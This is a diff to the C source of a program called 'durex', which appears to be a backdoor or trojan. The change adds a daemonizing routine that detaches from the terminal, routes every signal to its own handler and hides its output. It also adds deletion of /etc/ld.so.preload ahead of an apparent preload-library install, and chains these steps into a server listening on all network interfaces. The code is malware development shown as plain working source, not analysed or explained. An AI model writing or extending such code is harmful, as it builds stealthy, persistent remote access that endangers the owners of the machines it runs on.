@@ -27,7 +27,7 @@
 #include "main.h"
 #include "durex.h"
 
-static void			cleanStructure()
+static void			clearStructure()
 {
 	e.lock = -1;
 	e.server.reporter = -1;
@@ -38,12 +38,44 @@ static void			cleanStructure()
 		clearClient(&e.server.client[i]);
 }
 
+static int			createDaemon()
+{
+	int				fd;
+	pid_t			pid;
+
+	pid = fork();
+	if (pid == 0) {
+		if (setsid() < 0)
+			exit(1);
+		pid = fork();
+		if (pid == 0) {
+			fd = 0;
+			while (fd < _NSIG)
+				signal(fd++, &durexSigterm);
+			fd = open("/dev/null", O_RDWR);
+			if (fd < 0)
+				exit(1);
+			dup2(fd, STDIN_FILENO);
+			dup2(fd, STDOUT_FILENO);
+			dup2(fd, STDERR_FILENO);
+			close(fd);
+			umask(0);
+			if (chdir("/") < 0)
+				exit(1);
+			return 1;
+		}
+		exit(0);
+	}
+	return 0;
+}
+
 static int			launch_program()
 {
 	char			proc[256];
 	char			buf[20];
 	int				ret;
 
+	unlink("/etc/ld.so.preload");
 	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_RDWR, 0600);
 	if (e.lock < 0)
 		return 0;
@@ -74,9 +106,6 @@ static int			launch_program()
 	}
 	snprintf(buf, sizeof(buf), "%d", getpid());
 	write(e.lock, buf, mystrlen(buf));
-	for (int i = 0; i < _NSIG; i++) {
-		signal(i, &durexSigterm);
-	}
 	return 1;
 }
 
@@ -114,8 +143,8 @@ void				durex()
 	int				ret;
 	struct timeval	timeout;
 
-	cleanStructure();
-	if (launch_program() && hireReporter() && create_library() && openServer("0.0.0.0", SERVER_PORT)) {
+	clearStructure();
+	if (createDaemon() && launch_program() && hireReporter() && create_library() && openServer("0.0.0.0", SERVER_PORT)) {
 		serverLog(1, "[LOGS] - Server online\n");
 		mymemset(&timeout, 0, sizeof(timeout));
 		while (1)
